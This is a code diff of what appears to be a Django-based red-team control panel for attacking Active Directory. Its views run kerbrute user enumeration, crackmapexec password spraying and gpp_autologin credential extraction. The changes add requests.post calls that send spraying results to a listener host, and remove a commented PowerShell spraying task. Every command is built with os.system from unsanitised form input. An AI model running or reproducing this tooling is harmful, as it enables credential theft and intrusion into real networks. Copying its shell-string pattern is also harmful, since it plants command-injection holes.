@@ -1,7 +1,7 @@
 import os
 from blog.views import *
 from blog.models import *
-
+import requests
 current_path= os.path.dirname(os.path.abspath(__file__))
 tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/ToolsScripts"
 
@@ -941,7 +941,14 @@ def UserEnumwithKerbrute(request):
         domain = request.POST['domain']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{4}' >> {3};{5}/kerbrute/dist/kerblin userenum -d {0} --dc {1} {2}  > {4}KerpUserEnum ".format(domain,dc_ip,users_list,result_path,result_dir,tools_path))
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        resultl="https://{0}:8000/results/{1}/".format(ip,agent)
+        os.system("echo '\n\n===============kerbrute O/P===============' >> {3};{5}/kerbrute/dist/kerblin userenum -d {0} --dc {1} {2}  | cut -d \":\" -f 4 | sed 's/[[:space:]]//g;'| cut -d \"@\" -f 1 |sed '1,11d' > {4}KerpUserEnum > /tmp/history;".format(domain,dc_ip,users_list,result_path,result_dir,tools_path))
+        # with open("/tmp/history", "r") as f:
+        #     result = f.read()
+        output="OutPut in the following path:\n{}".format(result_path)
+        requests.post(resultl, data={"result": output})
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -963,17 +970,7 @@ def GPO_windapsearch(request):
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
-
-
-# def pass_spray(request, agent='', password=''):
-#     if request.method=='POST':
-#         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
-#         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
-#         with open(task_path, "w") as f:
-#             f.write(task)
-#             f.close()
-#     else:
-#         return render(request, 'blog/listeners.html')        
+     
 
 def CME_pass_spray(request):
     if request.method=='POST':
@@ -986,8 +983,14 @@ def CME_pass_spray(request):
         DCip = request.POST['DCip']
         users_list = request.POST['users_list']
         password = request.POST['password']
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        resultl="https://{0}:8000/results/{1}/".format(ip,agent)
         result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
-        os.system("echo '===============Password Spraying===============' >> {3};crackmapexec smb {0} -u {1} -p {2} | grep + | sed 's/\x1B[@A-Z\\\]^_]\|\x1B\[[0-9:;<=>?]*[-!\"\#$%&'\"'\"'()*+,.\/]*[][\\@A-Z^_`a-z{{|}}~]//g' >> {3};".format(DCip,users_list,password,result_path))
+        os.system("echo '\n\n===============Password Spraying===============' >> {3};crackmapexec smb {0} -u {1} -p {2} | grep + | sed 's/\x1B[@A-Z\\\]^_]\|\x1B\[[0-9:;<=>?]*[-!\"\#$%&'\"'\"'()*+,.\/]*[][\\@A-Z^_`a-z{{|}}~]//g' >> {3} > /tmp/history;".format(DCip,users_list,password,result_path))
+        with open("/tmp/history", "r") as f:
+            result = f.read()
+        requests.post(resultl, data={"result": result})
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -1352,7 +1355,7 @@ def gpp_autologin(request): ####
         password = request.POST['password']   ## optional
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============gpp_autologin===============' >> {0}; crackmapexec smb {1} -u {2} -p {3} -M gpp_autologin | sed 's/\x1B[@A-Z\\\]^_]\|\x1B\[[0-9:;<=>?]*[-!\"\#$%&'\"'\"'()*+,.\/]*[][\\@A-Z^_`a-z{{|}}~]//g' >>{0}".format(result_path, ip,username,password))
+        os.system("echo '===============gpp_autologin===============' >> {0}; crackmapexec smb {1} -u {2} -p {3} -M gpp_autologin | sed 's/\x1B[@A-Z\\\]^_]\|\x1B\[[0-9:;<=>?]*[-!\"\#$%&'\"'\"'()*+,.\/]*[][\\@A-Z^_`a-z{{|}}~]//g' >>{0} > /tmp/history ".format(result_path, ip,username,password))
 
         return JsonResponse({},status=200)
     else:
